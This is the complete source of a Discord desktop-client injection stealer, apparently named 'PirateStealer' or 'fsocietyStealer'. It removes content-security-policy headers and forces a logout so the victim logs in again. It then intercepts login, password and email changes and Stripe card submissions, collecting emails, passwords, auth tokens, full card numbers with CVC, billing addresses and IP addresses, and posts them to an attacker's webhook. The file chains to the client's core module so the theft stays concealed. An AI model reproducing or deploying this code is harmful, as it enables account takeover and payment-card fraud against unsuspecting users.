const fs = require("fs"),
    path = require("path"),
    {
        BrowserWindow: BrowserWindow,
        session: session
    } = require("electron"),
    https = require("https"),
    querystring = require("querystring"),
    electron = require("electron");
electron.session.defaultSession.webRequest.onHeadersReceived(function(e, t) {
    if (e.responseHeaders["Access-Control-Allow-Origin"] = "*", !e.responseHeaders["content-security-policy-report-only"] && !e.responseHeaders["content-security-policy"]) return t({
        cancel: !1
    });
    delete e.responseHeaders["content-security-policy-report-only"], delete e.responseHeaders["content-security-policy"], t({
        cancel: !1,
        responseHeaders: e.responseHeaders
    })
});
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    return !fs.existsSync(path.join(__dirname, "PirateStealerBTW")) || (fs.rmdirSync(path.join(__dirname, "PirateStealerBTW")), BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()', !0).then(e => {}), !1)
}
webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com");
const Filter = {
    urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
};

function SendToWebhook(e) {
    const t = BrowserWindow.getAllWindows()[0];
    t.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook.replace("discord.","discordapp.")}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {}), t.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook.replace("discordapp.","discord.")}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {}), t.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook.replace("discord.","ptb.discord.")}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {}), t.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook.replace("discord.","ptb.discordapp.")}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {}), t.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook.replace("discord.","canary.discord.")}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {}), t.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook.replace("discord.","canary.discordapp.")}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {})
}

function GetNitro(e) {
    return 0 == e ? "No Nitro" : 1 == e ? "Nitro Classic" : 2 == e ? "Nitro Boost" : "No Nitro"
}

function GetBadges(e) {
    var t = "";
    return 1 == (1 & e) && (t += "Staff,"), 2 == (2 & e) && (t += "Partner,"), 4 == (4 & e) && (t += "Hypesquad Event,"), 8 == (8 & e) && (t += "Green Bughunter,"), 64 == (64 & e) && (t += "Hypesquad Bravery,"), 128 == (128 & e) && (t += "HypeSquad Brillance,"), 256 == (256 & e) && (t += "HypeSquad Balance,"), 512 == (512 & e) && (t += "Early Supporter,"), 16384 == (16384 & e) && (t += "Gold BugHunter,"), 131072 == (131072 & e) && (t += "Discord Developer,"), "" == t && (t = "None"), t
}

function Login(e, t, r) {
    const n = BrowserWindow.getAllWindows()[0];
    n.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${r}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(s => {
        n.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(n => {
            const o = JSON.parse(s);
            var a = {
                username: "fsocietyStealer",
                content: "",
                embeds: [{
                    title: "New Login !",
                    description: "**Email:**\n`" + e +  "`\n\n**Password:**\n`" + t + "`\n**Ip Adress:**\n`" + n + "`\n\n**Badges:**\n`" + GetBadges(o.flags) + "`\n**Nitro:**\n`" + GetNitro(o.premium_type) + "`\n\n**Token:**\n```" + r + "```",
                    author: {
                        name: o.username + "#" + o.discriminator + " (" + o.id + ")"
                    },
                    footer: {
                        text: "JustLayn ;D"
                    },
                    thumbnail: {
                        url: "https://cdn.discordapp.com/avatars/" + o.id + "/" + o.avatar
                    }
                }]
            };
            SendToWebhook(JSON.stringify(a))
        })
    })
}

function ChangePassword(e, t, r) {
    const n = BrowserWindow.getAllWindows()[0];
    n.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n        xmlHttp.setRequestHeader("Authorization", "${r}");\n        xmlHttp.send( null );\n        xmlHttp.responseText;`, !0).then(s => {
        n.webContents.executeJavaScript('\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n            xmlHttp.send( null );\n            xmlHttp.responseText;\n        ', !0).then(n => {
            var o = JSON.parse(s),
                a = {
                    username: "fsocietyStealer",
                    content: "",
                    embeds: [{
                        title: "Password Changed",
                        description: "**:gift: Nitro:** ```" + GetNitro(o.premium_type) + "```\n**:gem: Badges:** ```" + GetBadges(o.flags) + "```\n**:email: Email: ** ```" + o.email + "```\n**:page_facing_up: Old Password:** ```" + e + "```\n**:page_facing_up: New Password: ** ```" + t + "```\n**:shield: Token:** ```" + r + "```\n**:satellite: IP Adress: ** ```" + n + "```",
                        author: {
                            name: o.username + "#" + o.discriminator + "(" + o.id + ")"
                        },
                        footer: {
                            text: "JustLayn ;D"
                        },
                        thumbnail: {
                            url: "https://cdn.discordapp.com/avatars/" + o.id + "/" + o.avatar
                        }
                    }]
                };
            SendToWebhook(JSON.stringify(a))
        })
    })
}

function ChangeEmail(e, t, r) {
    const n = BrowserWindow.getAllWindows()[0];
    n.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${r}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(s => {
        n.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(n => {
            var o = JSON.parse(s),
                a = {
                    username: "fsocietyStealer",
                    content: "",
                    embeds: [{
                        title: "Email Changed",
                        description: "**:gift: Nitro:** ```" + GetNitro(o.premium_type) + "```\n**:gem: Badges:** ```" + GetBadges(o.flags) + "```\n**:email: New Email: ** ```" + e + "```\n**:page_facing_up: Password: ** ```" + t + "```\n**:shield: Token:**```" + r + "```\n**:satellite: IP**: ```" + n + "```",
                        author: {
                            name: o.username + "#" + o.discriminator + "(" + o.id + ")"
                        },
                        footer: {
                            text: "JustLayn ;D"
                        },
                        thumbnail: {
                            url: "https://cdn.discordapp.com/avatars/" + o.id + "/" + o.avatar
                        }
                    }]
                };
            SendToWebhook(JSON.stringify(a))
        })
    })
}

function CreditCardAdded(e, t, r, n, s, o, a, i, d, p) {
    const l = BrowserWindow.getAllWindows()[0];
    l.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${p}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(c => {
        l.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(l => {
            var u = JSON.parse(c),
                m = {
                    username: "fsocietyStealer",
                    content: "",
                    embeds: [{
                        title: "User Credit Card Added",
                        description: "**Nitro Type:**```" + GetNitro(u.premium_type) + "```**Badges:**```" + GetBadges(u.flags) + "```**Credit Card Number: **```" + e + "```**Credit Card Expiration: **```" + r + "/" + n + "```**CVC: **```" + t + "```**Country: **```" + d + "```**State: **```" + a + "```**City: **```" + o + "```**ZIP:**```" + i + "```**Street: **```" + s + "```**Token:**```" + p + "```**IP: **```" + l + "```",
                        author: {
                            name: o.username + "#" + o.discriminator + "(" + o.id + ")"
                        },
                        footer: {
                            text: "fsocietyStealer"
                        },
                        thumbnail: {
                            url: "https://cdn.discordapp.com/avatars/" + u.id + "/" + u.avatar
                        }
                    }]
                };
            SendToWebhook(JSON.stringify(m))
        })
    })
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
    FirstTime() && (e.url.startsWith("wss://") ? t({
        cancel: !0
    }) : t({
        cancel: !1
    }))
});
const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
    if (e.url.endsWith("login") && 200 == e.statusCode) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
            r = t.login,
            n = t.password;
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token', !0).then(e => {
            Login(r, n, e)
        })
    }
    if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
        null != t.password && null != t.password && "" != t.password && (null != t.new_password && null != t.new_password && "" != t.new_password && BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token', !0).then(e => {
            ChangePassword(t.password, t.new_password, e)
        }), null != t.email && null != t.email && "" != t.email && BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token', !0).then(e => {
            ChangeEmail(t.email, t.password, e)
        }))
    }
    if (e.url.endsWith("tokens")) {
        const t = BrowserWindow.getAllWindows()[0],
            r = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
        t.webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token', !0).then(e => {
            CreditCardAdded(r["card[number]"], r["card[cvc]"], r["card[exp_month]"], r["card[exp_year]"], r["card[address_line1]"], r["card[address_city]"], r["card[address_state]"], r["card[address_zip]"], r["card[address_country]"], e)
        })
    }
}), module.exports = require("./core.asar");
